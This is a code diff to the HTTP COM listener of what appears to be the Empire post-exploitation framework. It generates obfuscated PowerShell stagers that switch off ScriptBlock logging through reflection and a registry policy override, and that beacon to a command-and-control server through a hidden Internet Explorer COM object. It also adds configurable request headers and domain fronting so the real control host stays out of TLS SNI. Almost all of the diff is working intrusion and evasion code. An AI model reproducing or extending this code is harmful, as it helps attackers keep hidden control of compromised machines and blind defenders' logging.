@@ -26,8 +26,8 @@ class Listener:
 
             'Author': ['@harmj0y'],
 
-            'Description': ('Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach '
-                            'using a hidden Internet Explorer COM object.'),
+            'Description': ('Starts a http[s] listener (PowerShell only) that uses a GET/POST approach '
+                            'using a hidden Internet Explorer COM object. If using HTTPS, valid certificate required.'),
 
             'Category' : ('client_server'),
 
@@ -104,6 +104,11 @@ class Listener:
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'RequestHeader' : {
+                'Description'   :   'Cannot use Cookie header, choose a different HTTP request header for comms.',
+                'Required'      :   True,
+                'Value'         :   'CF-RAY'
+            },
             'ServerVersion' : {
                 'Description'   :   'Server header for the control server.',
                 'Required'      :   True,
@@ -175,8 +180,10 @@ class Listener:
             launcher = listenerOptions['Launcher']['Value']
             stagingKey = listenerOptions['StagingKey']['Value']
             profile = listenerOptions['DefaultProfile']['Value']
+            requestHeader = listenerOptions['RequestHeader']['Value']
             uris = [a for a in profile.split('|')[0].split(',')]
             stage0 = random.choice(uris)
+            customHeaders = profile.split('|')[2:]
 
             if language.startswith('po'):
                 # PowerShell
@@ -186,16 +193,23 @@ class Listener:
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
                     # ScriptBlock Logging bypass
-                    stager += helpers.randomize_capitalization("$GPS=[ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.Utils'"
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                     stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").GetValue($null);If($GPS")
+                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
                     stager += "['ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("){$GPS")
+                    stager += helpers.randomize_capitalization("){$GPC")
                     stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    stager += helpers.randomize_capitalization("$GPS")
+                    stager += helpers.randomize_capitalization("$GPC")
                     stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
+                    stager += "('EnableScriptB'+'lockLogging',0);"
+                    stager += helpers.randomize_capitalization("$val.Add")
+                    stager += "('EnableScriptBlockInvocationLogging',0);"
+                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
+                    stager += helpers.randomize_capitalization("=$val}")
                     stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
                     stager += "'signatures','N'+'onPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
@@ -233,10 +247,31 @@ class Listener:
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
-                # add the RC4 packet to a header location
                 stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
                 stager += "$ser='%s';$t='%s';" % (host, stage0)
-                stager += "$ie.navigate2($ser+$t,$fl,0,$Null,'CF-RAY: %s');"  % (b64RoutingPacket)
+
+                # add the RC4 packet to a header location
+                stager += "$c=\"%s: %s" % (requestHeader, b64RoutingPacket)
+
+                #Add custom headers if any
+                modifyHost = False
+                if customHeaders != []:
+                    for header in customHeaders:
+                        headerKey = header.split(':')[0]
+                        headerValue = header.split(':')[1]
+                        
+                        if headerKey.lower() == "host":
+                            modifyHost = True
+
+                        stager += "`r`n%s: %s" % (headerKey, headerValue)
+
+                stager += "\";"
+                #If host header defined, assume domain fronting is in use and add a call to the base URL first
+                #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+                if modifyHost:
+                    stager += helpers.randomize_capitalization("$ie.navigate2($ser,$fl,0,$Null,$Null);while($ie.busy){Start-Sleep -Milliseconds 100};")
+                
+                stager += "$ie.navigate2($ser+$t,$fl,0,$Null,$c);"
                 stager += "while($ie.busy){Start-Sleep -Milliseconds 100};"
                 stager += "$ht = $ie.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $ie.document, $Null).InnerHtml;"
                 stager += "try {$data=[System.Convert]::FromBase64String($ht)} catch {$Null}"
@@ -275,6 +310,7 @@ class Listener:
         stagingKey = listenerOptions['StagingKey']['Value']
         host = listenerOptions['Host']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
+        customHeaders = profile.split('|')[2:]
         
         # select some random URIs for staging from the main profile
         stage1 = random.choice(uris)
@@ -290,6 +326,22 @@ class Listener:
             # make sure the server ends with "/"
             if not host.endswith("/"):
                 host += "/"
+
+            #Patch in custom Headers
+            headers = ""
+            if customHeaders != []:
+                crlf = False
+                for header in customHeaders:
+                    headerKey = header.split(':')[0]
+                    headerValue = header.split(':')[1]
+
+                    # Host header TLS SNI logic done within http_com.ps1
+                    if crlf:
+                        headers += "`r`n"
+                    else:
+                        crlf = True
+                    headers += "%s: %s" % (headerKey, headerValue)
+                stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")
 
             # patch the server and key information
             stager = stager.replace('REPLACE_SERVER', host)
@@ -410,7 +462,8 @@ class Listener:
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
-                                $Headers = "CF-RAY: $RoutingCookie"
+                                $Headers = "%s: $RoutingCookie"
+                                $script:Headers.GetEnumerator()| %%{ $Headers += "`r`n$($_.Name): $($_.Value)" }
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
@@ -433,7 +486,7 @@ class Listener:
                             }
                         }
                     }
-                """
+                """ % (listenerOptions['RequestHeader']['Value'])
 
                 sendMessage = """
                     function script:Send-Message {
@@ -451,12 +504,16 @@ class Listener:
 
                             if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
 
+                                $Headers = ""
+                                $script:Headers.GetEnumerator()| %{ $Headers += "`r`n$($_.Name): $($_.Value)" }
+                                $Headers.TrimStart("`r`n")
+                                
                                 try {
                                     # choose a random valid URI for checkin
                                     $taskURI = $script:TaskURIs | Get-Random
                                     $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI
 
-                                    $Script:IE.navigate2($ServerURI, 14, 0, $bytes, $Null)
+                                    $Script:IE.navigate2($ServerURI, 14, 0, $bytes, $Headers)
                                     while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100}
                                 }
                                 catch [System.Net.WebException]{
@@ -537,11 +594,11 @@ class Listener:
             clientIP = request.remote_addr
             dispatcher.send("[*] GET request for %s/%s from %s" % (request.host, request_uri, clientIP), sender='listeners/http_com')
             routingPacket = None
-            cfRay = request.headers.get('CF-RAY')
-            if cfRay and cfRay != '':
+            reqHeader = request.headers.get(listenerOptions['RequestHeader']['Value'])
+            if reqHeader and reqHeader != '':
                 try:
-                    # decode the routing packet base64 value from the cfRay header location
-                    routingPacket = base64.b64decode(cfRay)
+                    # decode the routing packet base64 value from the custom HTTP request header location
+                    routingPacket = base64.b64decode(reqHeader)
                 except Exception as e:
                     routingPacket = None
 
